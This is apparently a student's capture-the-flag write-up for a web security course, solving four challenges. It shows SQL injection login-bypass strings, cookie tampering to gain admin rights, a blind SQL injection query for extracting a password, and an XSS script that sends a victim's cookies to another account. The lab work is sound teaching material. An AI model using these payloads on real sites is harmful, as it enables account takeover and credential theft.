# 1
> Username: `testing`
## Solution
type `' OR name like '%%` in the username field to get match any username

type `' OR password like '%%` in the password field to match any password

---

# 2
> Username: `testing`
## Solution
1. Downloaded a cookie modifying browser extension from [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related)
2. Modified the `username` cookie, setting the value to `admin`
3. Modified the `admin` cookie, setting the value to `True`
4. Reloaded the page

---

# 3
> Username: `testing`
## Solution
1. Ran this query on the game multiple times to construct the password `53768999`
2. Guessed that dog's name was scotty (from previous problems)

## Code
```sql
1' AND ID=(select COUNT(*) from users where name='admin' AND substr(password,1,1) BETWEEN '5' AND '5') OR ID='
```

---

# 4
> Username: `testing`
## Solution
Sent the below code as the message to `admin`, the received message was 
```js
{
    sender:admin,
    recipient:reallynow,
    message:
        username=admin; 
        password=admin; 
        flag=csce465{xss_ftw_4f93062d}
}
```

## Code
```html
<script>
    var formData = new FormData();
    formData.append('message', document.cookie);
    formData.append('recipient', 'reallynow');
    formData.append('name', 'admin');

    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://csce465shell.martincarlisle.com/problem/19369/sendmessage.php', true);
    xhr.send(formData);

    //# sourceURL=dynamicScript.js 
</script>
```
## Help Received
[https://stackoverflow.com/questions/58217910/xmlhttprequest-not-sending-post-data](https://stackoverflow.com/questions/58217910/xmlhttprequest-not-sending-post-data)